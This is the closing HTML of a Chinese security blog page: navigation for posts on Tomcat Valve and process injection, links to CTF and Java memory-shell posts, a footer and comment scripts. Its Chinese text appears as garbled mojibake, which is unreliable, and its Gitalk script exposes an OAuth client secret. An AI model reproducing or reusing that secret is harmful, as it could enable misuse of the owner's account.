<span class="toc-text">Tomcat Valve æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.5.</span> <span class="toc-text">è¿›ç¨‹æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TODO"><span class="toc-number">1.4.</span> <span class="toc-text">TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.5.</span> <span class="toc-text">å‚è€ƒèµ„æ–™</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022å¤ç°"><img src="/img/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GoogleCTF2022å¤ç°"/></a><div class="content"><a class="title" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022å¤ç°">GoogleCTF2022å¤ç°</a><time datetime="2022-07-20T11:38:09.000Z" title="å‘è¡¨äº 2022-07-20 19:38:09">2022-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVAå†…å­˜é©¬æ”»å‡»ç¯‡"><img src="/img/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVAå†…å­˜é©¬æ”»å‡»ç¯‡"/></a><div class="content"><a class="title" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVAå†…å­˜é©¬æ”»å‡»ç¯‡">JAVAå†…å­˜é©¬æ”»å‡»ç¯‡</a><time datetime="2022-07-17T16:10:18.000Z" title="å‘è¡¨äº 2022-07-18 00:10:18">2022-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXEå¤‡å¿˜å½•"><img src="/img/cover5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXEå¤‡å¿˜å½•"/></a><div class="content"><a class="title" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXEå¤‡å¿˜å½•">XXEå¤‡å¿˜å½•</a><time datetime="2022-07-08T02:54:17.000Z" title="å‘è¡¨äº 2022-07-08 10:54:17">2022-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="æŸciscnåˆ†åŒºä¸¤ä¸ªé¢˜è§£"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æŸciscnåˆ†åŒºä¸¤ä¸ªé¢˜è§£"/></a><div class="content"><a class="title" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="æŸciscnåˆ†åŒºä¸¤ä¸ªé¢˜è§£">æŸciscnåˆ†åŒºä¸¤ä¸ªé¢˜è§£</a><time datetime="2022-06-21T23:53:58.000Z" title="å‘è¡¨äº 2022-06-22 07:53:58">2022-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/18/MapReduce%E4%B8%89%E4%B8%AA%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/" title="MapReduceä¸‰ä¸ªå…¥é—¨æ¡ˆä¾‹"><img src="https://img.dem0dem0.top/images/image-20220618093502409.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MapReduceä¸‰ä¸ªå…¥é—¨æ¡ˆä¾‹"/></a><div class="content"><a class="title" href="/2022/06/18/MapReduce%E4%B8%89%E4%B8%AA%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/" title="MapReduceä¸‰ä¸ªå…¥é—¨æ¡ˆä¾‹">MapReduceä¸‰ä¸ªå…¥é—¨æ¡ˆä¾‹</a><time datetime="2022-06-17T16:29:51.000Z" title="å‘è¡¨äº 2022-06-18 00:29:51">2022-06-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Dem0</div><div class="footer_custom_text">åŠªåŠ›ä¸ä¸€å®šèƒ½å®ç°æ¢¦æƒ³ï¼Œä½†æ˜¯æ›¾ç»åŠªåŠ›è¿‡çš„äº‹å®å´è¶³ä»¥å®‰æ…°è‡ªå·±</br><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="åšå®¢æ¡†æ¶ä¸º Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="ä¸»é¢˜é‡‡ç”¨ Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://cloud.tencent.com/"><img src="https://img.shields.io/badge/cdn-Tencent-orange" title="æœ¬ç«™ä½¿ç”¨ Tencent ä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿ" alt="Tencent"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/3em0"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="æœ¬ç«™é¡¹ç›®ç”± GitHub æ‰˜ç®¡" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«4.0å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'c752b82ba7eb272e07ff',
      clientSecret: '2032517bf35f44c10890d7bd2d1daf1dc35ce43e',
      repo: '3em0.github.io',
      owner: '3em0',
      admin: ['3em0'],
      id: 'ca8cc5950b3676452018957884ae40ee',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>